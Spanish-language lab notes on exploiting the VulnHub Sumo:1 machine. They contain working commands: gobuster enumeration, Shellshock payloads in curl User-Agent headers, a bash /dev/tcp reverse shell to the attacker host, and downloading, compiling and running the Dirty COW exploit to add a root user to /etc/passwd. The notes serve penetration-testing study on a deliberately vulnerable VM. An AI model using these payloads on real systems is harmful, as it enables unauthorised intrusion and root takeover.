> El kernel (núcleo) es la parte fundamental del sistema operativo, actuando como intermediario entre el software (aplicaciones) y el hardware (CPU, memoria, dispositivos). Gestiona los recursos del sistema, la memoria y la prioridad de los procesos, asegurando que el software acceda al hardware de manera segura y eficiente.
## Laboratorio
- Utilizamos una imagen iso de `vulnhub` **sumo:1** 
- Descargamos el mirror y ejecutamos
- Descubrimos la ip
- Puertos abiertos
- Vamos a explotar primero el laboratorio para despues si escalar privilegios
- La vulnerabilidad sera [[Shellshock]]

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Dirbuster -u http://192.168.111.45 -t 20 --add-slash
```
- descubrimos /cgi-bin/

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Dirbuster -u http://192.168.111.45/cgi-bin -t 20 --add-slash -x pl,cgi,sh
```
- Descubrimos el recurso http://192.168.111.45/cgi-bin/test.sh

- Explotamos
```
curl -s "http://192.168.111.45/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```
- Aplicamos reverse shell
```
curl -s "http://192.168.111.45/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.111.46/443 1>&2'"
```
- Por el otro lado
```
nc -nvlp 443
```

- Arreglamos la consola
```
script /dev/null -c bash
ctrl_z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
stty rows 44 columns 22
```

## Paso a paso

```
lsb_release -a
```
- Para saber que distribucion tiene especificamente y el kernel
```
searchsploit kernel 3.2 
```
- Buscamos una forma de explotar ese kernel

- En este caso como es vieja la version es vulnerable a un tipo especifico de ataque **dirty cow** que es un script en C, basado en race condition.
- Es una vulnerabilidad que sobreescribe en el `/etc/passwd` y crea un usuario root nuevo con una contrasenia a eleccion.

```
searchsplit dirty cow /etc/passwd PTRACE_POKEDATA 
```
- Buscamos el exploit especifico
- Para descargarte el archivo
```
searchsploit -m linux/local/40839.c
mv 40839.c dirty.c
```

- Servimos
```
python3 -m http.server 80
```
- Descargamos
```
wget 192.168.111.46/dirty.c
```
- Nos dice como compilarlo
```
cat dirtycow.c | grep gcc
gcc -pthread dirty.c -o dirty -lcrypt
```
- Ejecutamos
```
./dirty
```
- Y listo, si vemos el /etc/passwd veremos el nuevo usuario `firefart` en vez de root
```
su firefart
id
touch a
ls -l a
```

- Hay muchas formas de explotar versiones antiguas de linux pero esta estaba mas enfocada en el kernel.
- Para ver que contiene un script de searchsploit
```
searchsploit -x <numero del script>
```
- Esta es una herramienta para enumerar vulnerabilidades del kernel
```
les.sh
```







